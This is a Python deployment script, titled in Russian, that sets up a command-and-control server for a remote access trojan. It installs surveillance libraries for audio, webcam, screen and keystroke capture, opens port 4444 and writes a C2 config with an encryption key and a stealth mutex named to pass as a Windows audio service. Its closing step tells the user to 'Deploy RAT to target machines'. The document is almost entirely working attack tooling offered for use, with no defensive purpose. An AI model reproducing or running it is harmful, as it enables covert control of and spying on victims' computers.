# === ПОЛНАЯ ИНСТРУКЦИЯ ПО РАЗВЕРТЫВАНИЮ C2 СЕРВЕРА ===

# 1. server_deploy.py - Автоматический деплоймент скрипт
import os
import sys
import subprocess
import socket
import requests
from cryptography.fernet import Fernet

class C2Deployer:
    def __init__(self):
        self.setup_commands = {
            'ubuntu': [
                'apt update',
                'apt install -y python3 python3-pip git',
                'pip3 install cryptography fernet pyaudio opencv-python mss numpy pynput',
                'ufw allow 4444',
                'ufw allow 80',
                'ufw allow 443'
            ],
            'centos': [
                'yum update -y',
                'yum install -y python3 python3-pip git',
                'pip3 install cryptography fernet pyaudio opencv-python mss numpy pynput',
                'firewall-cmd --permanent --add-port=4444/tcp',
                'firewall-cmd --reload'
            ],
            'windows': [
                'powershell -Command "Install-PackageProvider -Name NuGet -Force"',
                'powershell -Command "Install-Module -Name Python -Force"'
            ]
        }
    
    def detect_os(self):
        """Определение операционной системы"""
        if os.name == 'nt':
            return 'windows'
        elif os.name == 'posix':
            with open('/etc/os-release') as f:
                if 'ubuntu' in f.read().lower():
                    return 'ubuntu'
                elif 'centos' in f.read().lower():
                    return 'centos'
        return 'unknown'
    
    def setup_server(self):
        """Настройка сервера"""
        os_type = self.detect_os()
        print(f"[*] Detected OS: {os_type}")
        
        if os_type == 'unknown':
            print("[-] Unsupported OS")
            return False
            
        print("[+] Installing dependencies...")
        for cmd in self.setup_commands[os_type]:
            try:
                subprocess.run(cmd, shell=True, check=True)
                print(f"[+] Success: {cmd}")
            except subprocess.CalledProcessError as e:
                print(f"[-] Failed: {cmd} - {e}")
        
        return True
    
    def configure_network(self):
        """Настройка сети и портов"""
        print("[+] Configuring network...")
        
        # Проверка доступности порта
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind(('0.0.0.0', 4444))
            print("[+] Port 4444 is available")
        except OSError:
            print("[-] Port 4444 is already in use")
            return False
        finally:
            sock.close()
        
        # Настройка проброса портов (если нужно)
        print("[*] If behind NAT, configure port forwarding:")
        print("    - External port: 4444 -> Internal port: 4444")
        print("    - Protocol: TCP")
        
        return True
    
    def generate_config(self, public_ip=None):
        """Генерация конфигурационных файлов"""
        if not public_ip:
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
            except:
                public_ip = "YOUR_SERVER_IP"
        
        config = f"""
# C2 Server Configuration
C2_SERVER = "{public_ip}"
C2_PORT = 4444
ENCRYPTION_KEY = "{Fernet.generate_key().decode()}"

# Stealth settings
MUTEX_NAME = "Global\\WindowsAudioService_{public_ip.replace('.', '_')}"
RECONNECT_TIME = 30

# Logging
LOG_FILE = "/var/log/c2_server.log"
MAX_CLIENTS = 50
"""
        
        with open("c2_config.py", "w") as f:
            f.write(config)
        
        print(f"[+] Configuration generated with IP: {public_ip}")
        return public_ip

def main():
    deployer = C2Deployer()
    
    print("=== C2 SERVER DEPLOYMENT ===")
    
    # 1. Настройка сервера
    if not deployer.setup_server():
        return
    
    # 2. Настройка сети
    if not deployer.configure_network():
        return
    
    # 3. Генерация конфигурации
    public_ip = deployer.generate_config()
    
    print("\n[+] Deployment completed!")
    print(f"[*] C2 Server IP: {public_ip}")
    print("[*] Port: 4444")
    print("\nNext steps:")
    print("1. Configure port forwarding on your router")
    print("2. Start the C2 server: python3 advanced_c2_controller.py")
    print("3. Deploy RAT to target machines")

if __name__ == "__main__":
    main()